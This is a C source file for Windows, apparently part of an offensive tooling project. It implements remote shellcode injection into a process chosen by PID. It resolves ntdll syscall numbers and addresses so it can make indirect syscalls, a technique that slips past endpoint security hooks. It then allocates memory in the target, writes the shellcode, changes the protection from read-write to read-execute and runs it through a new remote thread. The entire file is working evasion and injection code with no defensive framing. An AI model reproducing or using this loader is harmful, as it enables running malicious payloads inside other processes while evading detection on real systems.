#include "Box.h"



/*-------------------------------------------------------[Populate SSN and Syscall]---------------------------------------------------*/


VOID IDSC
(
	IN HMODULE ntdll,
	IN LPCSTR NtApi,
	OUT DWORD* FuncSSN,
	OUT PUINT_PTR FuncSyscall
)
{

	if (!FuncSSN || !FuncSyscall)
		return;

	UINT_PTR NtFunction = (UINT_PTR)GetProcAddress(ntdll, NtApi);
	if (!NtFunction)
	{
		WARN("Could Not Resolve Nt Function! Reason: %ld", GetLastError());
		return;
	}


	*FuncSyscall = NtFunction + 0x12;
	*FuncSSN = ((unsigned char*)NtFunction + 4)[0];

	INFO("[SSN: 0x%p] | [Syscall: 0x%p] | %s", *FuncSSN, (PVOID)*FuncSyscall, NtApi);

}


/*-----------------------------------------------------[Indirect Syscalls]------------------------------------------------------*/


BOOL IndirectShellInjection(
	_In_ CONST DWORD PID,
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)

{


	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	HMODULE    NtdllHandle = NULL;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	NtdllHandle = GetModuleHandleW(L"NTDLL");
	if (NULL == NtdllHandle) {
		WARN("GetModuleHandleW", GetLastError());
		return FALSE;
	}
	OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);


	/*-------------------------------------[Externally calling all function from DirectSyscalls.asm]-------------------------------------------------------*/


	IDSC(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN, &g_NtOpenProcessSyscall);
	IDSC(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN, &g_NtAllocateVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN, &g_NtCreateThreadExSyscall);
	IDSC(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall);
	IDSC(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN, &g_NtFreeVirtualMemorySyscall);
	IDSC(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall);


	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);


	/*------------------------------------------------------------------------[Writing Shellcode to Virtual Memory]-----------------------------------------------------------*/


	// Write the newly decrypted shellcode inside
	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, pShellcode, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RX]");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	INFO("Execution Completed! Cleaning Up!");




CLEANUP:


	if (rBuffer) {
		STATUS = NtFreeVirtualMemory(hProcess, &rBuffer, &sSizeofShellcode, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
			WARN("NtFreeVirtualMemory", STATUS);
		}
		else {
			INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
		}
	}

	if (hThread) {
		NtClose(hThread);
		INFO("[0x%p] handle on thread closed", hThread);
	}

	if (hProcess) {
		NtClose(hProcess);
		INFO("[0x%p] handle on process closed", hProcess);


	}
}